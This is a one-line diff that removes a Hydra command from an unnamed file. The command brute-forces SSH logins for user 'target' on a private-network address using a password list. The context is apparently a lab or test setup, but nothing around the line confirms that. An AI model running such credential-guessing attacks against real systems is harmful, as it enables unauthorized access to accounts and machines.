@@ -1,1 +1,0 @@
-hydra -l target -P passwords.txt -t 4 ssh://192.168.241.130
